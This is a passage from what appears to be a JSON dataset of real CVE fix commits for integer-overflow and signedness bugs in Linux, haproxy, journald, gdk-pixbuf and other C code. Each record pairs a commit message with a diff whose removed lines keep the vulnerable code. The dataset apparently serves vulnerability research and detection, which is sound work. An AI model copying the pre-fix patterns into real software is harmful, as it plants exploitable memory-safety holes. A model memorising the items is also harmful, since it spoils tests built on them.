malloc(size_t lb)\n # define GC_SIZE_MAX (~(size_t)0)\n #endif\n \n+#define GC_SQRT_SIZE_MAX ((1U << (WORDSZ \/ 2)) - 1)\n+\n void * calloc(size_t n, size_t lb)\n {\n-    if (lb && n > GC_SIZE_MAX \/ lb)\n+    if ((lb | n) > GC_SQRT_SIZE_MAX \/* fast initial test *\/\n+        && lb && n > GC_SIZE_MAX \/ lb)\n       return NULL;\n #   if defined(GC_LINUX_THREADS) \/* && !defined(USE_PROC_FOR_LIBRARIES) *\/\n         \/* libpthread allocated some memory that is only pointed to by  *\/\n","owner":"ivmai","repo":"bdwgc","source":"cve"},{"CVE_ID":"CVE-2011-2209","CWE_ID":"189","category":"security","commit_id":"21c5977a836e399fc710ff2c5367845ed5c2527f","commit_message":"From 21c5977a836e399fc710ff2c5367845ed5c2527f Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <drosenberg@vsecurity.com>\nDate: Wed, 15 Jun 2011 15:09:01 -0700\nSubject: alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but\nmostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds\nkernel memory to userland.\n\n2. Signedness issue in osf_sysinfo allows copying large amounts of\nkernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy\nsize, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows\nprivilege escalation via writing return value of sys_wait4 to kernel\nmemory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: Richard Henderson <rth@twiddle.net>\nCc: Ivan Kokshaysky <ink@jurassic.park.msu.ru>\nCc: Matt Turner <mattst88@gmail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n arch\/alpha\/kernel\/osf_sys.c | 11 +++++++----\n 1 file changed, 7 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/arch\/alpha\/kernel\/osf_sys.c b\/arch\/alpha\/kernel\/osf_sys.c\nindex 376f22130791..326f0a2d56e5 100644\n--- a\/arch\/alpha\/kernel\/osf_sys.c\n+++ b\/arch\/alpha\/kernel\/osf_sys.c\n@@ -409,7 +409,7 @@ SYSCALL_DEFINE2(osf_getdomainname, char __user *, name, int, namelen)\n \t\treturn -EFAULT;\n \n \tlen = namelen;\n-\tif (namelen > 32)\n+\tif (len > 32)\n \t\tlen = 32;\n \n \tdown_read(&uts_sem);\n@@ -594,7 +594,7 @@ SYSCALL_DEFINE3(osf_sysinfo, int, command, char __user *, buf, long, count)\n \tdown_read(&uts_sem);\n \tres = sysinfo_table[offset];\n \tlen = strlen(res)+1;\n-\tif (len > count)\n+\tif ((unsigned long)len > (unsigned long)count)\n \t\tlen = count;\n \tif (copy_to_user(buf, res, len))\n \t\terr = -EFAULT;\n@@ -649,7 +649,7 @@ SYSCALL_DEFINE5(osf_getsysinfo, unsigned long, op, void __user *, buffer,\n \t\treturn 1;\n \n \tcase GSI_GET_HWRPB:\n-\t\tif (nbytes < sizeof(*hwrpb))\n+\t\tif (nbytes > sizeof(*hwrpb))\n \t\t\treturn -EINVAL;\n \t\tif (copy_to_user(buffer, hwrpb, nbytes) != 0)\n \t\t\treturn -EFAULT;\n@@ -1008,6 +1008,7 @@ SYSCALL_DEFINE4(osf_wait4, pid_t, pid, int __user *, ustatus, int, options,\n {\n \tstruct rusage r;\n \tlong ret, err;\n+\tunsigned int status = 0;\n \tmm_segment_t old_fs;\n \n \tif (!ur)\n@@ -1016,13 +1017,15 @@ SYSCALL_DEFINE4(osf_wait4, pid_t, pid, int __user *, ustatus, int, options,\n \told_fs = get_fs();\n \t\t\n \tset_fs (KERNEL_DS);\n-\tret = sys_wait4(pid, ustatus, options, (struct rusage __user *) &r);\n+\tret = sys_wait4(pid, (unsigned int __user *) &status, options,\n+\t\t\t(struct rusage __user *) &r);\n \tset_fs (old_fs);\n \n \tif (!access_ok(VERIFY_WRITE, ur, sizeof(*ur)))\n \t\treturn -EFAULT;\n \n \terr = 0;\n+\terr |= put_user(status, ustatus);\n \terr |= __put_user(r.ru_utime.tv_sec, &ur->ru_utime.tv_sec);\n \terr |= __put_user(r.ru_utime.tv_usec, &ur->ru_utime.tv_usec);\n \terr |= __put_user(r.ru_stime.tv_sec, &ur->ru_stime.tv_sec);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-6269","CWE_ID":"189","category":"security","commit_id":"b4d05093bc89f71377230228007e69a1434c1a0c","commit_message":"From b4d05093bc89f71377230228007e69a1434c1a0c Mon Sep 17 00:00:00 2001\nFrom: Willy Tarreau <w@1wt.eu>\nDate: Mon, 1 Sep 2014 20:35:55 +0200\nSubject: [PATCH] BUG\/CRITICAL: http: don't update msg->sov once data start to\n leave the buffer\n\nCommit bb2e669 (\"BUG\/MAJOR: http: correctly rewind the request body\nafter start of forwarding\") was incorrect\/incomplete. It used to rely on\nCF_READ_ATTACHED to stop updating msg->sov once data start to leave the\nbuffer, but this is unreliable because since commit a6eebb3 (\"[BUG]\nsession: clear BF_READ_ATTACHED before next I\/O\") merged in 1.5-dev1,\nthis flag is only ephemeral and is cleared once all analysers have\nseen it. So we can start updating msg->sov again each time we pass\nthrough this place with new data. With a sufficiently large amount of\ndata, it is possible to make msg->sov wrap and validate the if()\ncondition at the top, causing the buffer to advance by about 2GB and\ncrash the process.\n\nNote that the offset cannot be controlled by the attacker because it is\na sum of millions of small random sizes depending on how many bytes were\nread by the server and how many were left in the buffer, only because\nof the speed difference between reading and writing. Also, nothing is\nwritten, the invalid pointer resulting from this operation is only read.\n\nMany thanks to James Dempsey for reporting this bug and to Chris Forbes for\nnarrowing down the faulty area enough to make its root cause analysable.\n\nThis fix must be backported to haproxy 1.5.\n(cherry picked from commit a2d002aeb669a9bbca2dcd3e6be71615f435e9e6)\n---\n include\/types\/channel.h |    2 +-\n src\/proto_http.c        |    8 ++++----\n src\/stream_interface.c  |    4 ++--\n 3 files changed, 7 insertions(+), 7 deletions(-)\n\n","diff_code":"diff --git a\/include\/types\/channel.h b\/include\/types\/channel.h\nindex 88a52a4..8bc3958 100644\n--- a\/include\/types\/channel.h\n+++ b\/include\/types\/channel.h\n@@ -105,7 +105,7 @@\n #define CF_STREAMER       0x00010000  \/* the producer is identified as streaming data *\/\n #define CF_STREAMER_FAST  0x00020000  \/* the consumer seems to eat the stream very fast *\/\n \n-\/* unused: 0x00040000 *\/\n+#define CF_WROTE_DATA     0x00040000  \/* some data were sent from this buffer *\/\n #define CF_ANA_TIMEOUT    0x00080000  \/* the analyser timeout has expired *\/\n #define CF_READ_ATTACHED  0x00100000  \/* the read side is attached for the first time *\/\n #define CF_KERN_SPLICING  0x00200000  \/* kernel splicing desired for this channel *\/\ndiff --git a\/src\/proto_http.c b\/src\/proto_http.c\nindex a47f0a1..4d27b2c 100644\n--- a\/src\/proto_http.c\n+++ b\/src\/proto_http.c\n@@ -4886,8 +4886,8 @@ void http_end_txn_clean_session(struct session *s)\n \ts->req->cons->conn_retries = 0;  \/* used for logging too *\/\n \ts->req->cons->exp       = TICK_ETERNITY;\n \ts->req->cons->flags    &= SI_FL_DONT_WAKE; \/* we're in the context of process_session *\/\n-\ts->req->flags &= ~(CF_SHUTW|CF_SHUTW_NOW|CF_AUTO_CONNECT|CF_WRITE_ERROR|CF_STREAMER|CF_STREAMER_FAST|CF_NEVER_WAIT|CF_WAKE_CONNECT);\n-\ts->rep->flags &= ~(CF_SHUTR|CF_SHUTR_NOW|CF_READ_ATTACHED|CF_READ_ERROR|CF_READ_NOEXP|CF_STREAMER|CF_STREAMER_FAST|CF_WRITE_PARTIAL|CF_NEVER_WAIT);\n+\ts->req->flags &= ~(CF_SHUTW|CF_SHUTW_NOW|CF_AUTO_CONNECT|CF_WRITE_ERROR|CF_STREAMER|CF_STREAMER_FAST|CF_NEVER_WAIT|CF_WAKE_CONNECT|CF_WROTE_DATA);\n+\ts->rep->flags &= ~(CF_SHUTR|CF_SHUTR_NOW|CF_READ_ATTACHED|CF_READ_ERROR|CF_READ_NOEXP|CF_STREAMER|CF_STREAMER_FAST|CF_WRITE_PARTIAL|CF_NEVER_WAIT|CF_WROTE_DATA);\n \ts->flags &= ~(SN_DIRECT|SN_ASSIGNED|SN_ADDR_SET|SN_BE_ASSIGNED|SN_FORCE_PRST|SN_IGNORE_PRST);\n \ts->flags &= ~(SN_CURR_SESS|SN_REDIRECTABLE|SN_SRV_REUSED);\n \n@@ -5430,7 +5430,7 @@ int http_request_forward_body(struct session *s, struct channel *req, int an_bit\n \t\t\t * such as last chunk of data or trailers.\n \t\t\t *\/\n \t\t\tb_adv(req->buf, msg->next);\n-\t\t\tif (unlikely(!(s->rep->flags & CF_READ_ATTACHED)))\n+\t\t\tif (unlikely(!(s->req->flags & CF_WROTE_DATA)))\n \t\t\t\tmsg->sov -= msg->next;\n \t\t\tmsg->next = 0;\n \n@@ -5482,7 +5482,7 @@ int http_request_forward_body(struct session *s, struct channel *req, int an_bit\n  missing_data:\n \t\/* we may have some pending data starting at req->buf->p *\/\n \tb_adv(req->buf, msg->next);\n-\tif (unlikely(!(s->rep->flags & CF_READ_ATTACHED)))\n+\tif (unlikely(!(s->req->flags & CF_WROTE_DATA)))\n \t\tmsg->sov -= msg->next + MIN(msg->chunk_len, req->buf->i);\n \n \tmsg->next = 0;\ndiff --git a\/src\/stream_interface.c b\/src\/stream_interface.c\nindex 67a5234..9f7e979 100644\n--- a\/src\/stream_interface.c\n+++ b\/src\/stream_interface.c\n@@ -658,7 +658,7 @@ static void si_conn_send(struct connection *conn)\n \tif (chn->pipe && conn->xprt->snd_pipe) {\n \t\tret = conn->xprt->snd_pipe(conn, chn->pipe);\n \t\tif (ret > 0)\n-\t\t\tchn->flags |= CF_WRITE_PARTIAL;\n+\t\t\tchn->flags |= CF_WRITE_PARTIAL | CF_WROTE_DATA;\n \n \t\tif (!chn->pipe->data) {\n \t\t\tput_pipe(chn->pipe);\n@@ -702,7 +702,7 @@ static void si_conn_send(struct connection *conn)\n \n \t\tret = conn->xprt->snd_buf(conn, chn->buf, send_flag);\n \t\tif (ret > 0) {\n-\t\t\tchn->flags |= CF_WRITE_PARTIAL;\n+\t\t\tchn->flags |= CF_WRITE_PARTIAL | CF_WROTE_DATA;\n \n \t\t\tif (!chn->buf->o) {\n \t\t\t\t\/* Always clear both flags once everything has been sent, they're one-shot *\/\n-- \n1.7.10.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-4391","CWE_ID":"189","category":"security","commit_id":"505b6a61c22d5565e9308045c7b9bf79f7d0517e","commit_message":"From 505b6a61c22d5565e9308045c7b9bf79f7d0517e Mon Sep 17 00:00:00 2001\nFrom: Lennart Poettering <lennart@poettering.net>\nDate: Wed, 19 Sep 2012 22:51:28 +0200\nSubject: journald: don't accept arbitrarily sized journal data fields\n\nhttps:\/\/bugzilla.redhat.com\/show_bug.cgi?id=858746\n---\n src\/journal\/journald-native.c | 10 ++++++++--\n 1 file changed, 8 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/src\/journal\/journald-native.c b\/src\/journal\/journald-native.c\nindex 4e44c3a..85458b5 100644\n--- a\/src\/journal\/journald-native.c\n+++ b\/src\/journal\/journald-native.c\n@@ -30,7 +30,8 @@\n #include \"journald-console.h\"\n #include \"journald-syslog.h\"\n \n-#define ENTRY_SIZE_MAX (1024*1024*32)\n+#define ENTRY_SIZE_MAX (1024*1024*64)\n+#define DATA_SIZE_MAX (1024*1024*64)\n \n static bool valid_user_field(const char *p, size_t l) {\n         const char *a;\n@@ -205,7 +206,12 @@ void server_process_native_message(\n                         memcpy(&l_le, e + 1, sizeof(uint64_t));\n                         l = le64toh(l_le);\n \n-                        if (remaining < e - p + 1 + sizeof(uint64_t) + l + 1 ||\n+                        if (l > DATA_SIZE_MAX) {\n+                                log_debug(\"Received binary data block too large, ignoring.\");\n+                                break;\n+                        }\n+\n+                        if ((uint64_t) remaining < e - p + 1 + sizeof(uint64_t) + l + 1 ||\n                             e[1+sizeof(uint64_t)+l] != '\\n') {\n                                 log_debug(\"Failed to parse message, ignoring.\");\n                                 break;\n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-0038","CWE_ID":"189","category":"security","commit_id":"093019cf1b18dd31b2c3b77acce4e000e2cbc9ce","commit_message":"From 093019cf1b18dd31b2c3b77acce4e000e2cbc9ce Mon Sep 17 00:00:00 2001\nFrom: Xi Wang <xi.wang@gmail.com>\nDate: Mon, 12 Dec 2011 21:55:52 +0000\nSubject: xfs: fix acl count validation in xfs_acl_from_disk()\n\nCommit fa8b18ed didn't prevent the integer overflow and possible\nmemory corruption.  \"count\" can go negative and bypass the check.\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\nSigned-off-by: Ben Myers <bpm@sgi.com>\n---\n fs\/xfs\/xfs_acl.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/fs\/xfs\/xfs_acl.c b\/fs\/xfs\/xfs_acl.c\nindex 76e4266d2e7e..ac702a6eab9b 100644\n--- a\/fs\/xfs\/xfs_acl.c\n+++ b\/fs\/xfs\/xfs_acl.c\n@@ -39,7 +39,7 @@ xfs_acl_from_disk(struct xfs_acl *aclp)\n \tstruct posix_acl_entry *acl_e;\n \tstruct posix_acl *acl;\n \tstruct xfs_acl_entry *ace;\n-\tint count, i;\n+\tunsigned int count, i;\n \n \tcount = be32_to_cpu(aclp->acl_cnt);\n \tif (count > XFS_ACL_MAX_ENTRIES)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-2022","CWE_ID":"189","category":"security","commit_id":"194b3da873fd334ef183806db751473512af29ce","commit_message":"From 194b3da873fd334ef183806db751473512af29ce Mon Sep 17 00:00:00 2001\nFrom: Vasiliy Kulikov <segoon@openwall.com>\nDate: Thu, 14 Apr 2011 20:55:16 +0400\nSubject: agp: fix arbitrary kernel memory writes\n\npg_start is copied from userspace on AGPIOC_BIND and AGPIOC_UNBIND ioctl\ncmds of agp_ioctl() and passed to agpioc_bind_wrap().  As said in the\ncomment, (pg_start + mem->page_count) may wrap in case of AGPIOC_BIND,\nand it is not checked at all in case of AGPIOC_UNBIND.  As a result, user\nwith sufficient privileges (usually \"video\" group) may generate either\nlocal DoS or privilege escalation.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Dave Airlie <airlied@redhat.com>\n---\n drivers\/char\/agp\/generic.c | 11 ++++++++---\n 1 file changed, 8 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/char\/agp\/generic.c b\/drivers\/char\/agp\/generic.c\nindex 850a643ad694..b072648dc3f6 100644\n--- a\/drivers\/char\/agp\/generic.c\n+++ b\/drivers\/char\/agp\/generic.c\n@@ -1095,8 +1095,8 @@ int agp_generic_insert_memory(struct agp_memory * mem, off_t pg_start, int type)\n \t\treturn -EINVAL;\n \t}\n \n-\t\/* AK: could wrap *\/\n-\tif ((pg_start + mem->page_count) > num_entries)\n+\tif (((pg_start + mem->page_count) > num_entries) ||\n+\t    ((pg_start + mem->page_count) < pg_start))\n \t\treturn -EINVAL;\n \n \tj = pg_start;\n@@ -1130,7 +1130,7 @@ int agp_generic_remove_memory(struct agp_memory *mem, off_t pg_start, int type)\n {\n \tsize_t i;\n \tstruct agp_bridge_data *bridge;\n-\tint mask_type;\n+\tint mask_type, num_entries;\n \n \tbridge = mem->bridge;\n \tif (!bridge)\n@@ -1142,6 +1142,11 @@ int agp_generic_remove_memory(struct agp_memory *mem, off_t pg_start, int type)\n \tif (type != mem->type)\n \t\treturn -EINVAL;\n \n+\tnum_entries = agp_num_entries();\n+\tif (((pg_start + mem->page_count) > num_entries) ||\n+\t    ((pg_start + mem->page_count) < pg_start))\n+\t\treturn -EINVAL;\n+\n \tmask_type = bridge->driver->agp_type_to_mask_type(bridge, type);\n \tif (mask_type != 0) {\n \t\t\/* The generic routines know nothing of memory types *\/\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-4164","CWE_ID":"189","category":"security","commit_id":"5ef41308f94dcbb3b7afc56cdef1c2ba53fa5d2f","commit_message":"From 5ef41308f94dcbb3b7afc56cdef1c2ba53fa5d2f Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <drosenberg@vsecurity.com>\nDate: Fri, 12 Nov 2010 12:44:42 -0800\nSubject: x25: Prevent crashing when parsing bad X.25 facilities\n\nNow with improved comma support.\n\nOn parsing malformed X.25 facilities, decrementing the remaining length\nmay cause it to underflow.  Since the length is an unsigned integer,\nthis will result in the loop continuing until the kernel crashes.\n\nThis patch adds checks to ensure decrementing the remaining length does\nnot cause it to wrap around.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/x25\/x25_facilities.c | 12 +++++++++---\n 1 file changed, 9 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/net\/x25\/x25_facilities.c b\/net\/x25\/x25_facilities.c\nindex 3a8c4c419cd4..55187c8f6420 100644\n--- a\/net\/x25\/x25_facilities.c\n+++ b\/net\/x25\/x25_facilities.c\n@@ -61,6 +61,8 @@ int x25_parse_facilities(struct sk_buff *skb, struct x25_facilities *facilities,\n \twhile (len > 0) {\n \t\tswitch (*p & X25_FAC_CLASS_MASK) {\n \t\tcase X25_FAC_CLASS_A:\n+\t\t\tif (len < 2)\n+\t\t\t\treturn 0;\n \t\t\tswitch (*p) {\n \t\t\tcase X25_FAC_REVERSE:\n \t\t\t\tif((p[1] & 0x81) == 0x81) {\n@@ -104,6 +106,8 @@ int x25_parse_facilities(struct sk_buff *skb, struct x25_facilities *facilities,\n \t\t\tlen -= 2;\n \t\t\tbreak;\n \t\tcase X25_FAC_CLASS_B:\n+\t\t\tif (len < 3)\n+\t\t\t\treturn 0;\n \t\t\tswitch (*p) {\n \t\t\tcase X25_FAC_PACKET_SIZE:\n \t\t\t\tfacilities->pacsize_in  = p[1];\n@@ -125,6 +129,8 @@ int x25_parse_facilities(struct sk_buff *skb, struct x25_facilities *facilities,\n \t\t\tlen -= 3;\n \t\t\tbreak;\n \t\tcase X25_FAC_CLASS_C:\n+\t\t\tif (len < 4)\n+\t\t\t\treturn 0;\n \t\t\tprintk(KERN_DEBUG \"X.25: unknown facility %02X, \"\n \t\t\t       \"values %02X, %02X, %02X\\n\",\n \t\t\t       p[0], p[1], p[2], p[3]);\n@@ -132,6 +138,8 @@ int x25_parse_facilities(struct sk_buff *skb, struct x25_facilities *facilities,\n \t\t\tlen -= 4;\n \t\t\tbreak;\n \t\tcase X25_FAC_CLASS_D:\n+\t\t\tif (len < p[1] + 2)\n+\t\t\t\treturn 0;\n \t\t\tswitch (*p) {\n \t\t\tcase X25_FAC_CALLING_AE:\n \t\t\t\tif (p[1] > X25_MAX_DTE_FACIL_LEN || p[1] <= 1)\n@@ -149,9 +157,7 @@ int x25_parse_facilities(struct sk_buff *skb, struct x25_facilities *facilities,\n \t\t\t\tbreak;\n \t\t\tdefault:\n \t\t\t\tprintk(KERN_DEBUG \"X.25: unknown facility %02X,\"\n-\t\t\t\t\t\"length %d, values %02X, %02X, \"\n-\t\t\t\t\t\"%02X, %02X\\n\",\n-\t\t\t\t\tp[0], p[1], p[2], p[3], p[4], p[5]);\n+\t\t\t\t\t\"length %d\\n\", p[0], p[1]);\n \t\t\t\tbreak;\n \t\t\t}\n \t\t\tlen -= p[1] + 2;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-4491","CWE_ID":"189","category":"security","commit_id":"ffec86ed5010c5a2be14f47b33bcf4ed3169a199","commit_message":"From ffec86ed5010c5a2be14f47b33bcf4ed3169a199 Mon Sep 17 00:00:00 2001\nFrom: Matthias Clasen <mclasen@redhat.com>\nDate: Mon, 13 Jul 2015 00:33:40 -0400\nSubject: [PATCH] pixops: Be more careful about integer overflow\n\nOur loader code is supposed to handle out-of-memory and overflow\nsituations gracefully, reporting errors instead of aborting. But\nif you load an image at a specific size, we also execute our\nscaling code, which was not careful enough about overflow in some\nplaces.\n\nThis commit makes the scaling code silently return if it fails to\nallocate filter tables. This is the best we can do, since\ngdk_pixbuf_scale() is not taking a GError.\n\nhttps:\/\/bugzilla.gnome.org\/show_bug.cgi?id=752297\n---\n gdk-pixbuf\/pixops\/pixops.c | 22 +++++++++++++++++-----\n 1 file changed, 17 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/gdk-pixbuf\/pixops\/pixops.c b\/gdk-pixbuf\/pixops\/pixops.c\nindex 29a1c140a..ce517456e 100644\n--- a\/gdk-pixbuf\/pixops\/pixops.c\n+++ b\/gdk-pixbuf\/pixops\/pixops.c\n@@ -1272,7 +1272,16 @@ make_filter_table (PixopsFilter *filter)\n   int i_offset, j_offset;\n   int n_x = filter->x.n;\n   int n_y = filter->y.n;\n-  int *weights = g_new (int, SUBSAMPLE * SUBSAMPLE * n_x * n_y);\n+  gsize n_weights;\n+  int *weights;\n+\n+  n_weights = SUBSAMPLE * SUBSAMPLE * n_x * n_y;\n+  if (n_weights \/ (SUBSAMPLE * SUBSAMPLE * n_x) != n_y)\n+    return NULL; \/* overflow, bail *\/\n+\n+  weights = g_try_new (int, n_weights);\n+  if (!weights)\n+    return NULL; \/* overflow, bail *\/\n \n   for (i_offset=0; i_offset < SUBSAMPLE; i_offset++)\n     for (j_offset=0; j_offset < SUBSAMPLE; j_offset++)\n@@ -1347,8 +1356,11 @@ pixops_process (guchar         *dest_buf,\n   if (x_step == 0 || y_step == 0)\n     return; \/* overflow, bail out *\/\n \n-  line_bufs = g_new (guchar *, filter->y.n);\n   filter_weights = make_filter_table (filter);\n+  if (!filter_weights)\n+    return; \/* overflow, bail out *\/\n+\n+  line_bufs = g_new (guchar *, filter->y.n);\n \n   check_shift = check_size ? get_check_shift (check_size) : 0;\n \n@@ -1468,7 +1480,7 @@ tile_make_weights (PixopsFilterDimension *dim,\n \t\t   double                 scale)\n {\n   int n = ceil (1 \/ scale + 1);\n-  double *pixel_weights = g_new (double, SUBSAMPLE * n);\n+  double *pixel_weights = g_malloc_n (sizeof (double) * SUBSAMPLE, n);\n   int offset;\n   int i;\n \n@@ -1526,7 +1538,7 @@ bilinear_magnify_make_weights (PixopsFilterDimension *dim,\n     }\n \n   dim->n = n;\n-  dim->weights = g_new (double, SUBSAMPLE * n);\n+  dim->weights = g_malloc_n (sizeof (double) * SUBSAMPLE, n);\n \n   pixel_weights = dim->weights;\n \n@@ -1617,7 +1629,7 @@ bilinear_box_make_weights (PixopsFilterDimension *dim,\n \t\t\t   double                 scale)\n {\n   int n = ceil (1\/scale + 3.0);\n-  double *pixel_weights = g_new (double, SUBSAMPLE * n);\n+  double *pixel_weights = g_malloc_n (sizeof (double) * SUBSAMPLE, n);\n   double w;\n   int offset, i;\n \n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2017-5546","CWE_ID":"189","category":"security","commit_id":"c4e490cf148e85ead0d1b1c2caaba833f1d5b29f","commit_message":"From c4e490cf148e85ead0d1b1c2caaba833f1d5b29f Mon Sep 17 00:00:00 2001\nFrom: John Sperbeck <jsperbeck@google.com>\nDate: Tue, 10 Jan 2017 16:58:24 -0800\nSubject: [PATCH] mm\/slab.c: fix SLAB freelist randomization duplicate entries\n\nThis patch fixes a bug in the freelist randomization code.  When a high\nrandom number is used, the freelist will contain duplicate entries.  It\nwill result in different allocations sharing the same chunk.\n\nIt will result in odd behaviours and crashes.  It should be uncommon but\nit depends on the machines.  We saw it happening more often on some\nmachines (every few hours of running tests).\n\nFixes: c7ce4f60ac19 (\"mm: SLAB freelist randomization\")\nLink: http:\/\/lkml.kernel.org\/r\/20170103181908.143178-1-thgarnie@google.com\nSigned-off-by: John Sperbeck <jsperbeck@google.com>\nSigned-off-by: Thomas Garnier <thgarnie@google.com>\nCc: Christoph Lameter <cl@linux.com>\nCc: Pekka Enberg <penberg@kernel.org>\nCc: David Rientjes <rientjes@google.com>\nCc: Joonsoo Kim <iamjoonsoo.kim@lge.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n mm\/slab.c | 8 ++++----\n 1 file changed, 4 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/mm\/slab.c b\/mm\/slab.c\nindex 29bc6c0dedd07..4f2ec6bb46ebe 100644\n--- a\/mm\/slab.c\n+++ b\/mm\/slab.c\n@@ -2457,7 +2457,6 @@ union freelist_init_state {\n \t\tunsigned int pos;\n \t\tunsigned int *list;\n \t\tunsigned int count;\n-\t\tunsigned int rand;\n \t};\n \tstruct rnd_state rnd_state;\n };\n@@ -2483,8 +2482,7 @@ static bool freelist_state_initialize(union freelist_init_state *state,\n \t} else {\n \t\tstate->list = cachep->random_seq;\n \t\tstate->count = count;\n-\t\tstate->pos = 0;\n-\t\tstate->rand = rand;\n+\t\tstate->pos = rand % count;\n \t\tret = true;\n \t}\n \treturn ret;\n@@ -2493,7 +2491,9 @@ static bool freelist_state_initialize(union freelist_init_state *state,\n \/* Get the next entry on the list and randomize it using a random shift *\/\n static freelist_idx_t next_random_slot(union freelist_init_state *state)\n {\n-\treturn (state->list[state->pos++] + state->rand) % state->count;\n+\tif (state->pos >= state->count)\n+\t\tstate->pos = 0;\n+\treturn state->list[state->pos++];\n }\n \n \/* Swap two freelist entries *\/\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-2642","CWE_ID":"189","category":"security","commit_id":"d4139205b010ed06310d14284e63114e88ec6de2","commit_message":"From d4139205b010ed06310d14284e63114e88ec6de2 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Jos=C3=A9=20Aliste?= <jaliste@src.gnome.org>\nDate: Tue, 7 Dec 2010 15:56:47 -0300\nSubject: [PATCH] backends: Fix several security issues in the dvi-backend.\n\nSee CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.\n---\n backend\/dvi\/mdvi-lib\/afmparse.c |  2 +-\n backend\/dvi\/mdvi-lib\/dviread.c  |  4 ++++\n backend\/dvi\/mdvi-lib\/pk.c       | 11 ++++++++++-\n backend\/dvi\/mdvi-lib\/tfmfile.c  |  3 ++-\n backend\/dvi\/mdvi-lib\/vf.c       |  6 ++++++\n 5 files changed, 23 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/backend\/dvi\/mdvi-lib\/afmparse.c b\/backend\/dvi\/mdvi-lib\/afmparse.c\nindex 164366b0..361e23d6 100644\n--- a\/backend\/dvi\/mdvi-lib\/afmparse.c\n+++ b\/backend\/dvi\/mdvi-lib\/afmparse.c\n@@ -160,7 +160,7 @@ static char *token(FILE *stream)\n     \n     idx = 0;\n     while (ch != EOF && ch != ' ' && ch != lineterm \n-           && ch != '\\t' && ch != ':' && ch != ';') \n+           && ch != '\\t' && ch != ':' && ch != ';' && idx < MAX_NAME)\n     {\n         ident[idx++] = ch;\n         ch = fgetc(stream);\ndiff --git a\/backend\/dvi\/mdvi-lib\/dviread.c b\/backend\/dvi\/mdvi-lib\/dviread.c\nindex cd8cfa91..d0143205 100644\n--- a\/backend\/dvi\/mdvi-lib\/dviread.c\n+++ b\/backend\/dvi\/mdvi-lib\/dviread.c\n@@ -1507,6 +1507,10 @@ int\tspecial(DviContext *dvi, int opcode)\n \tInt32\targ;\n \t\n \targ = dugetn(dvi, opcode - DVI_XXX1 + 1);\n+\tif (arg <= 0) {\n+\t\tdvierr(dvi, _(\"malformed special length\\n\"));\n+\t\treturn -1;\n+\t}\n \ts = mdvi_malloc(arg + 1);\n \tdread(dvi, s, arg);\n \ts[arg] = 0;\ndiff --git a\/backend\/dvi\/mdvi-lib\/pk.c b\/backend\/dvi\/mdvi-lib\/pk.c\nindex a5791869..08377e63 100644\n--- a\/backend\/dvi\/mdvi-lib\/pk.c\n+++ b\/backend\/dvi\/mdvi-lib\/pk.c\n@@ -469,6 +469,15 @@ static int pk_load_font(DviParams *unused, DviFont *font)\n \t\t\t}\n \t\t\tif(feof(p))\n \t\t\t\tbreak;\n+\n+\t\t\t\/* Although the PK format support bigger char codes,\n+                         * XeTeX and other extended TeX engines support charcodes up to\n+                         * 65536, while normal TeX engine supports only charcode up to 255.*\/\n+\t\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t\tmdvi_error (_(\"%s: unexpected charcode (%d)\\n\"),\n+\t\t\t\t\t    font->fontname,cc);\n+\t\t\t\tgoto error;\n+\t\t\t} \n \t\t\tif(cc < loc)\n \t\t\t\tloc = cc;\n \t\t\tif(cc > hic)\n@@ -512,7 +521,7 @@ static int pk_load_font(DviParams *unused, DviFont *font)\n \t}\n \n \t\/* resize font char data *\/\n-\tif(loc > 0 || hic < maxch-1) {\n+\tif(loc > 0 && hic < maxch-1) {\n \t\tmemmove(font->chars, font->chars + loc, \n \t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n \t\tfont->chars = xresize(font->chars,\ndiff --git a\/backend\/dvi\/mdvi-lib\/tfmfile.c b\/backend\/dvi\/mdvi-lib\/tfmfile.c\nindex 73ebf26a..8c2a30b2 100644\n--- 